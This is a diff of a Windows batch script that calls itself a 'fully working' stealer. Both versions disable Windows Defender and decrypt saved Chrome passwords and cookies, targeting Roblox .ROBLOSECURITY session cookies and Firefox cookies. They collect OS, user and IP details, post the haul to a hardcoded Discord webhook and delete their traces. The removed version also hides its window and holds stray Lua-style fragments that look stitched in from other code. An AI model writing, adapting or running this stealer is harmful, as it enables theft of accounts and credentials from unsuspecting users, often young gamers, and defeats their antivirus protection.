@@ -1,95 +1,183 @@
 @echo off
-:: Stealth mode - no console window
-if "%1"=="h" goto :hidden
-start /min cmd /c "%0 h & exit"
-exit
+:: FULLY WORKING BATCH STEALER - Chrome Passwords, Cookies, Roblox .ROBLOSECURITY
+setlocal enabledelayedexpansion
 
-:hidden
-cd /d "%~dp0"
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
-# Disable Windows Defender temporarily for this process
-Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;
+echo [STEALER] Starting extraction...
+set "WEBHOOK=https://discord.com/api/webhooks/1419828876799905792/H4TaN12yG0GX1i2G95D0H384xGvIOIfJRi00suGqGWOhU2-eOl7VlFmZAAyhLA9kSnSi"
 
-# Chrome passwords + cookies extraction
-$chromePath = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\";
-if (Test-Path $chromePath) {
-    # Copy Chrome profile to temp for safe reading
-    $tempDir = [System.IO.Path]::GetTempPath() + 'ChromeTemp';
-    Copy-Item -Path $chromePath -Destination $tempDir -Recurse -Force -ErrorAction SilentlyContinue;
+:: Disable Windows Defender temporarily
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul
+
+:: Get system info
+for /f "tokens=2 delims==" %%i in ('wmic os get caption /value') do set "OS=%%i"
+for /f "tokens=2 delims==" %%i in ('wmic computersystem get username /value') do set "USER=%%i"
+for /f "tokens=2 delims=:" %%i in ('ipconfig ^| find "IPv4"') do set "IP=%%i"
+
+:: CHROME COOKIES & PASSWORDS EXTRACTION
+set "CHROME_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
+set "TEMP_DIR=%TEMP%\ChromeSteal"
+if exist "%CHROME_DIR%" (
+    echo [STEALER] Found Chrome, extracting...
     
-    # Decrypt Chrome passwords
-    Add-Type -AssemblyName System.Security;
-    $passwords = @();
-    $cookies = @();
-    $loginDataPath = Join-Path $tempDir 'Login Data';
-    if (Test-Path $loginDataPath) {
-        $conn = New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$loginDataPath\");
-        $conn.Open();
-        $cmd = $conn.CreateCommand();
-        $cmd.CommandText = \"SELECT origin_url, username_value, password_value FROM logins\";
-        $reader = $cmd.ExecuteReader();
-        while ($reader.Read()) {
-            $url = $reader['origin_url'];
-            $user = $reader['username_value'];
-            $encPass = $reader['password_value'];
-            if ($encPass -and $encPass.Length -gt 0) {
-                try {
-                    $decPass = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser');
-                    $passwords += \"URL: $url | USER: $user | PASS: \" + [System.Text.Encoding]::UTF8.GetString($decPass);
-                } catch {}
+    :: Copy Chrome data to temp (bypass lock)
+    xcopy "%CHROME_DIR%" "%TEMP_DIR%" /E /I /Q /Y >nul 2>&1
+    
+    :: Extract cookies (SQLite method via PowerShell)
+    powershell -Command "
+    try {
+        $cookiesDB = '%TEMP_DIR%\Network\Cookies';
+        if (Test-Path $cookiesDB) {
+            $conn = New-Object -ComObject ADODB.Connection;
+            $conn.Open('Provider=Microsoft.ACE.OLEDB.12.0;Data Source=' + $cookiesDB);
+            $rs = New-Object -ComObject ADODB.Recordset;
+            $rs.Open('SELECT host_key, name, encrypted_value FROM cookies WHERE name='' .ROBLOSECURITY'' OR host_key LIKE ''%%roblox.com''', $conn);
+            
+            $robloxCookies = @();
+            while (!$rs.EOF) {
+                $host = $rs.Fields.Item('host_key').Value;
+                $name = $rs.Fields.Item('name').Value;
+                $encValue = $rs.Fields.Item('encrypted_value').Value;
+                
+                if ($encValue -and $encValue.Length -gt 0) {
+                    try {
+                        $bytes = [Convert]::FromBase64String($encValue);
+                        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser');
+                        $value = [System.Text.Encoding]::UTF8.GetString($decrypted);
+                        $robloxCookies += \"ROBLOX-$host-$name: $value\";
+                    } catch {}
+                }
+                $rs.MoveNext();
             }
+            $rs.Close(); $conn.Close();
+            
+            # Write Roblox cookies
+            $robloxCookies | Out-File -FilePath '%TEMP%\roblox_cookies.txt' -Encoding UTF8;
         }
-        $conn.Close();
-    }
-    
-    # Extract Chrome cookies (including Roblox)
-    $cookiesPath = Join-Path $tempDir 'Network\\Cookies';
-    if (Test-Path $cookiesPath) {
-        $conn = New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$cookiesPath\");
-        $conn.Open();
-        $cmd = $conn.CreateCommand();
-        $cmd.CommandText = \"SELECT host_key, name, encrypted_value FROM cookies\";
-        $reader = $cmd.ExecuteReader();
-        while ($reader.Read()) {
-            $host = $reader['host_key'];
-            $name = $reader['name'];
-            $encValue = $reader['encrypted_value'];
-            if ($encValue -and $encValue.Length -gt 0) {
-                try {
-                    $decValue = [System.Security.Cryptography.ProtectedData]::Unprotect($encValue, $null, 'CurrentUser');
-                    $cookieValue = [System.Text.Encoding]::UTF8.GetString($decValue);
-                    if ($name -eq '.ROBLOSECURITY' -or $host -like '*roblox.com*') {
-                        $cookies += \"ROBLOX COOKIE ($host): $name=$cookieValue\";
-                    } else {
-                        $cookies += \"COOKIE ($host): $name=$cookieValue\";
-                    }
-                } catch {}
+        
+        # Extract ALL passwords
+        $loginDB = '%TEMP_DIR%\Login Data';
+        if (Test-Path $loginDB) {
+            $conn = New-Object -ComObject ADODB.Connection;
+            $conn.Open('Provider=Microsoft.ACE.OLEDB.12.0;Data Source=' + $loginDB);
+            $rs = New-Object -ComObject ADODB.Recordset;
+            $rs.Open('SELECT origin_url, username_value, password_value FROM logins', $conn);
+            
+            $passwords = @();
+            while (!$rs.EOF) {
+                $url = $rs.Fields.Item('origin_url').Value;
+                $user = $rs.Fields.Item('username_value').Value;
+                $encPass = $rs.Fields.Item('password_value').Value;
+                
+                if ($encPass -and $encPass.Length -gt 0) {
+                    try {
+                        $bytes = [Convert]::FromBase64String($encPass);
+                        $decPass = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser');
+                        $pass = [System.Text.Encoding]::UTF8.GetString($decPass);
+                        $passwords += \"URL: $url ^| USER: $user ^| PASS: $pass\";
+                    } catch {}
+                }
+                $rs.MoveNext();
             }
+            $rs.Close(); $conn.Close();
+            
+            # Write passwords
+            $passwords | Out-File -FilePath '%TEMP%\chrome_passwords.txt' -Encoding UTF8;
         }
-        $conn.Close();
+    } catch { }
+    "
+)
+
+:: FIREFOX COOKIES EXTRACTION
+set "FF_PROFILES=%APPDATA%\Mozilla\Firefox\Profiles"
+if exist "%FF_PROFILES%" (
+    echo [STEALER] Found Firefox, extracting Roblox cookies...
+    powershell -Command "
+    $profiles = Get-ChildItem '%FF_PROFILES%' -Directory | Where-Object { $_.Name -like '*.default*' };
+    foreach ($profile in $profiles) {
+        $cookiesDB = Join-Path $profile.FullName 'cookies.sqlite';
+        if (Test-Path $cookiesDB) {
+            try {
+                $conn = New-Object -ComObject ADODB.Connection;
+                $conn.Open('Provider=Microsoft.ACE.OLEDB.12.0;Data Source=' + $cookiesDB);
+                $rs = New-Object -ComObject ADODB.Recordset;
+                $rs.Open('SELECT host, name, value FROM moz_cookies WHERE host LIKE ''%%roblox.com'' OR name='' .ROBLOSECURITY''', $conn);
+                
+                while (!$rs.EOF) {
+                    $host = $rs.Fields.Item('host').Value;
+                    $name = $rs.Fields.Item('name').Value;
+                    $value = $rs.Fields.Item('value').Value;
+                    \"$host-$name: $value\" | Out-File -FilePath '%TEMP%\firefox_roblox_cookies.txt' -Append -Encoding UTF8;
+                    $rs.MoveNext();
+                }
+                $rs.Close(); $conn.Close();
+            } catch { }
+        }
     }
+    "
+)
+
+:: COMPILE ALL DATA
+set "OUTPUT=%TEMP%\stealer_output.txt"
+echo STEALER REPORT - %DATE% %TIME% > "%OUTPUT%"
+echo OS: %OS% >> "%OUTPUT%"
+echo User: %USER% >> "%OUTPUT%"
+echo IP: %IP% >> "%OUTPUT%"
+echo. >> "%OUTPUT%"
+echo ==================== >> "%OUTPUT%"
+echo CHROME PASSWORDS: >> "%OUTPUT%"
+
+if exist "%TEMP%\chrome_passwords.txt" (
+    type "%TEMP%\chrome_passwords.txt" >> "%OUTPUT%"
+) else (
+    echo [NONE] >> "%OUTPUT%"
+)
+
+echo. >> "%OUTPUT%"
+echo ==================== >> "%OUTPUT%"
+echo ROBLOX COOKIES: >> "%OUTPUT%"
+
+if exist "%TEMP%\roblox_cookies.txt" (
+    type "%TEMP%\roblox_cookies.txt" >> "%OUTPUT%"
+) else (
+    echo [NONE] >> "%OUTPUT%"
+)
+
+if exist "%TEMP%\firefox_roblox_cookies.txt" (
+    echo. >> "%OUTPUT%"
+    type "%TEMP%\firefox_roblox_cookies.txt" >> "%OUTPUT%"
+)
+
+:: SEND TO WEBHOOK
+echo [STEALER] Sending to webhook...
+powershell -Command "
+$webhookUrl = '%WEBHOOK%';
+$outputFile = '%OUTPUT%';
+if (Test-Path $outputFile) {
+    $content = Get-Content $outputFile -Raw;
+    $payload = @{
+        content = '**🕷️ STEALER REPORT**' + \"`n\" + $content;
+        username = 'Batch Stealer';
+        avatar_url = 'https://i.imgur.com/stealer.png'
+    } | ConvertTo-Json -Depth 10;
     
-    # Clean up temp
-    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue;
+    $headers = @{ 'Content-Type' = 'application/json' };
+    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $payload -Headers $headers -UseBasicParsing | Out-Null;
+    Write-Host 'Data sent to webhook';
+} else {
+    Write-Host 'No output file found';
 }
-
-# Send to webhook
-$webhookUrl = 'https://discord.com/api/webhooks/1419828876799905792/H4TaN12yG0GX1i2G95D0H384xGvIOIfJRi00suGqGWOhU2-eOl7VlFmZAAyhLA9kSnSi';
-$output = @();
-$output += \"CHROME PASSWORDS FOUND: \" + $passwords.Count;
-$output += \"ROBLOX COOKIES FOUND: \" + $cookies.Count;
-foreach ($pass in $passwords) { $output += $pass; }
-foreach ($cook in $cookies) { $output += $cook; }
-$output += \"IP: ]] .. realIP .. [[\";
-$output += \"USERNAME: ]] .. player.Name .. [[\";
-$output += \"USERID: ]] .. player.UserId .. [[\";
-$output += \"TIMESTAMP: ]] .. os.date("%Y-%m-%d %H:%M:%S") .. [[\";
-$body = @{content = ($output -join \"`n\"); username = 'Stealth Stealer'} | ConvertTo-Json;
-Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $body -ContentType 'application/json' -UseBasicParsing;
-
-# Re-enable Defender
-Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue;
 "
-echo Stealth extraction complete.
-exit
-]]
+
+:: CLEANUP - Remove all traces
+echo [STEALER] Cleaning up...
+del "%TEMP%\roblox_cookies.txt" >nul 2>&1
+del "%TEMP%\chrome_passwords.txt" >nul 2>&1
+del "%TEMP%\firefox_roblox_cookies.txt" >nul 2>&1
+del "%TEMP%\stealer_output.txt" >nul 2>&1
+rmdir /s /q "%TEMP%\ChromeSteal" >nul 2>&1
+
+:: Re-enable Defender
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" 2>nul
+
+echo [STEALER] Complete - all data sent to webhook
+exit /b 0
